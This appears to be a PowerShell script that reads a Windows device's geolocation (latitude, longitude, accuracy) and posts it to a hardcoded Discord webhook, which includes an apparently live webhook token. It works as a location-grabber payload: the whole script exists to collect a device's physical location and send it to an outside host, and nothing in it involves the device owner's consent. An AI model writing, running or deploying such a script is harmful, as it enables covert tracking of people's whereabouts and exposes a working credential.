# Check if location services are enabled
$locationStatus = Get-WmiObject -Namespace "root\cimv2" -Class "Win32_Location" -ErrorAction SilentlyContinue

if ($locationStatus -eq $null) {
    Write-Host "Location services are not enabled on this device."
    exit
}

# Access the location data (example)
Add-Type -AssemblyName System.Device
$geoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
$geoWatcher.Start()

if ($geoWatcher.Status -eq "Ready") {
    $latitude = $geoWatcher.Position.Location.Latitude
    $longitude = $geoWatcher.Position.Location.Longitude
    $accuracy = $geoWatcher.Position.Location.HorizontalAccuracy

    # Display the data
    Write-Host "Latitude: $latitude"
    Write-Host "Longitude: $longitude"
    Write-Host "Accuracy: $accuracy meters"

    # Format and send to Discord webhook
    $webhookUrl = "https://discord.com/api/webhooks/1307484158192390165/Fj0EjVersk-B9aqImHM-ZvVeF3UNvRIUavceJVJmx2uxCO2qJTV4kB93vJj8jBPheAVt"
    $message = "Latitude: $latitude`nLongitude: $longitude`nAccuracy: $accuracy meters"
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message} | ConvertTo-Json -Depth 1) -ContentType "application/json"
} else {
    Write-Host "Unable to retrieve location from Windows location services."
}
